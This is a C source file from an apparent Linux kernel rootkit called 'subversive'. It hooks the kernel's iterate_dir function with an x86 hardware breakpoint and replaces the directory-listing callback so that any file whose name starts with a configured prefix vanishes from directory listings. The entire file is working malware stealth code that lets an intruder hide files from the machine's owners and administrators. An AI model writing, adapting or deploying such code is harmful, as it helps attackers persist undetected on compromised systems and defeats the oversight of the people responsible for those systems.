#include <linux/kernel.h>

#include <subversive/config.h>
#include <subversive/ksyms.h>
#include <subversive/vfs.h>
#include <subversive/x86.h>

static int is_name_hidden(const char *name)
{
	if (!strncmp(name, FILE_HIDDEN_PREFIX, strlen(FILE_HIDDEN_PREFIX))) {
		pr_debug("%s: hiding %s\n", __func__, name);
		return 1;
	}

	return 0;
}

/*
 * for kernel versions >= 3.11
 */
static __filldir_t old_filldir;

static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	if (is_name_hidden(name)) {
		return 0;
	}

	return old_filldir(__buf, name, namlen, offset, ino, d_type);
}

static void iterate_dir_hook(struct pt_regs *regs)
{
	struct __dir_context *ctx = (struct __dir_context *)regs->si;

	/*
	 * FIXME: not safe
	 */
	old_filldir = ctx->actor;
	ctx->actor = new_filldir;
}

void vfs_hook(void)
{
	unsigned long iterate_dir_p = get_symbol_addr("iterate_dir");

	if (!iterate_dir_p)
		return;

	x86_hw_breakpoint_register(1, iterate_dir_p, DR_RW_EXECUTE, 0, iterate_dir_hook);
}
